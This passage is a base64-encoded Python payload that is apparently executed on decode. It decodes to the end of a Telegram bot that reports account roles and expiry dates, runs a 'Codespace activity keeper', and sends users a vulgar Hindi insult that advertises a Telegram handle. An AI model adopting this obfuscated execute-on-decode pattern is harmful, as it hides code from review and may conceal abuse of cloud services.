iKlVzZXJuYW1lOiB7dXNlcm5hbWV9XG4iCiAgICAgICAgICAgICAgICAgICAgICAgIGYiUm9sZTogdXNlclxuIgogICAgICAgICAgICAgICAgICAgICAgICBmIlZhbGlkIFVudGlsOiB7dmFsaWRfdW50aWx9XG4iCiAgICAgICAgICAgICAgICAgICAgICAgIGYiVXNlciBpZDoge3VzZXJfaWR9KiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmVzcG9uc2UgPSAiKk5vIGFjY291bnQgaW5mb3JtYXRpb24gZm91bmQuIFBsZWFzZSBjb250YWN0IHRoZSBhZG1pbmlzdHJhdG9yLioiCiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsIHJlc3BvbnNlLCBwYXJzZV9tb2RlPSdNYXJrZG93bicpCiAgICBlbGlmIG1lc3NhZ2UudGV4dCA9PSAiSGVsMyI6CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICIqSGVscCBzZWxlY3RlZCoiLCBwYXJzZV9tb2RlPSdNYXJrZG93bicpCiAgICBlbGlmIG1lc3NhZ2UudGV4dCA9PSAiQ29udCI6CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICIqQ29udGFjdCBhZG1pbiBzZWxlY3RlZCoiLCBwYXJzZV9tb2RlPSdNYXJrZG93bicpCiAgICBlbHNlOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAnJycq4qCb4qCb4qO/4qO/4qO/4qO/4qO/4qG34qK24qOm4qO24qO24qOk4qOk4qOk4qOA4qCA4qCA4qCACsKg4qCA4qCA4qCA4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO34qGA4qCACsKg4qCA4qCA4qCA4qCJ4qCJ4qCJ4qCZ4qC74qO/4qO/4qC/4qC/4qCb4qCb4qCb4qC74qO/4qO/4qOH4qCACsKg4qCA4qCA4qKk4qOA4qOA4qOA4qCA4qCA4qK44qO34qGE4qCA4qOB4qOA4qOk4qO04qO/4qO/4qO/4qOGCsKg4qCA4qCA4qCA4qCA4qC54qCP4qCA4qCA4qCA4qO/4qOn4qCA4qC54qO/4qO/4qO/4qO/4qO/4qG/4qO/CsKg4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCb4qC/4qCH4qKA4qO84qO/4qO/4qCb4qKv4qG/4qGfCsKg4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCm4qC04qK/4qK/4qO/4qG/4qC34qCA4qO/4qCACsKg4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCZ4qO34qO24qO24qOk4qOk4qOk4qOk4qOk4qO24qOm4qCD4qCACsKg4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKQ4qO/4qO+4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qCA4qCACsKg4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qGH4qCA4qCACsKg4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCZ4qC74qK/4qO/4qO/4qO/4qO/4qCf4qCBICAgICAgICAgICAgICAgICAgICAK8J+krExhdWRlIGZhbHR1IHVuZ2FsaSBtYXQga2FyIFBBVEVMamlfNDcKIEdvIGFuZCB0YWxrIHRvIPCfmIpQYXRlbCBqaSAKRE0tIEBQQVRFTGppXzQ3ClBhdGVsIGppIHNlIGpha2FyIGJhYXQga2FyIApETS0gQFBBVEVMamlfNDcqJycnLCBwYXJzZV9tb2RlPSdNYXJrZG93bicpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgYXN5bmNpb190aHJlYWQgPSBUaHJlYWQodGFyZ2V0PXN0YXJ0X2FzeW5jaW9fdGhyZWFkLCBkYWVtb249VHJ1ZSkKICAgIGFzeW5jaW9fdGhyZWFkLnN0YXJ0KCkKICAgIGxvZ2dpbmcuaW5mbygiU3RhcnRpbmcgQ29kZXNwYWNlIGFjdGl2aXR5IGtlZXBlciBhbmQgVGVsZWdyYW0gYm90Li4uIikKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBib3QucG9sbGluZyhub25lX3N0b3A9VHJ1ZSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZ2dpbmcuZXJyb3IoZiJBbiBlcnJvciBvY2N1cnJlZCB3aGlsZSBwb2xsaW5nOiB7ZX0iKQogICAgICAgIGxvZ2dpbmcuaW5mbyhmIldhaXRpbmcgZm9yIHtSRVFVRVNUX0lOVEVSVkFMfSBzZWNvbmRzIGJlZm9yZSB0aGUgbmV4dCByZXF1ZXN0Li4uIikKICAgICAgICB0aW1lLnNsZWVwKFJFUVVFU1RfSU5URVJWQUwpCg=='))